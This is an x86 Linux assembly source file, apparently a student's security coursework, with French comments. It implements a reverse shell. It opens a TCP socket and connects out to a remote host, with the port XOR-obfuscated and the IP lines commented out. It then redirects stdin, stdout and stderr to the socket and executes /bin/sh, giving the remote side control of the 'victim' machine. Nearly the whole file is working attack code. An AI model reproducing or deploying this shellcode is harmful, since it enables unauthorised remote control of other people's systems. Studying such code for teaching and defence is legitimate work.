; NOM / Prénom : NEHME Ali
; REVERSE SHELL ASM
; M1 - Sécurité - GR3
; ESGI
;


section .text
    global _start


_start:
    ;; Création de la socket

    push 0x0167
    pop eax     ; socket 

    push 0x02
    pop ebx     ; domaine : AF_INET (IPv4)

    push 0x1
    pop ecx      ; type : SOCK_STREAM (TCP)

    xor edx, edx      ; protocole : The  protocol  specifies  a  particular  protocol to be used with the socket.  Normally only a single protocol exists to support a particular  socket type within a given protocol family, in which case protocol can be specified as 0.
    int 0x80

    mov edi, eax    ; On conserve la socket dans edi


    ;; Connection à la victime + scan des ports
    ;; Permet de se connecter à une socket si trouvé.
    ;; Cette "fonction" permet aussi de scanner à partir 
    ;; du paramètre "TRY_TO_FIND_PORT", une intervalle de port 
    ;; commençant par "PORT_ADDR".
    mov eax, 0x16a  ; connect
    mov ebx, edi    ; socket_fd (socket créé)

    ; push 16852806 ; Xored IP
    ; pop ecx
    ; xor ecx, 0x12739
    ; push ecx     ; IP   

    ; push 0x100007f
    ; fonctionne
    ; push 0x01012746 ; Xored IP
    ; pop ecx
    ; xor ecx, 0x12739
    ; push ecx     ; IP  

    

    ; push 0xbd0b0002     ;; port convertit à partir de "htons" + AF_INET
    
    ; push word 0xbd0b    ; port convertit à partir de "htons"
    ; push word 0x02       ; AF_INET

    ; pushw  0xbd0b    ; port convertit à partir de "htons"  ==> pushw
    ; pushw 0x02       ; AF_INET ==> pushw 

    ; push 0xbd0b0002 
    push 0xbd0a273b ; Xored port + AF_INET
    pop ecx
    xor ecx, 0x12739
    push ecx    ; port convertit à partir de "htons" + AF_INET

    mov ecx, esp    ; Struct sockaddr *addr
    mov edx, 0x10   ; size de sockaddr *addr
    int 0x80


    ;; Dup2 (duplication) pour stdin (redirige la stdin de la victime vers ma machine)
    mov eax, 0x3f   ; dup2
    mov ebx, edi    ; socket de la victime (connexion)
    mov ecx, 0x0    ; stdin
    int 0x80

    ;; Dup2 (duplication) pour stdout
    mov eax, 0x3f   ; dup2 
    inc ecx         ; stdout
    int 0x80

    ;; Dup2 (duplication) pour stderr
    mov eax, 0x3f   ; dup2
    inc ecx         ; stderr
    int 0x80



    ;; execve("/bin/sh", 0, 0)
    mov eax, 0x0b   ; execv
    ; /bin/sh
    push 0x0068732f ; hs/n
    push 0x6e69622f ; ib//
    lea ebx, [esp]
    mov ecx, 0x0    ; pas d'argument pour le shell
    mov edx, 0x0    ; pas d'argument pour le shell
    int 0x80

    ;; Exit avec un 0 (tout s'est bien passé)
    mov eax, 1
    mov ebx, 0
    int 0x80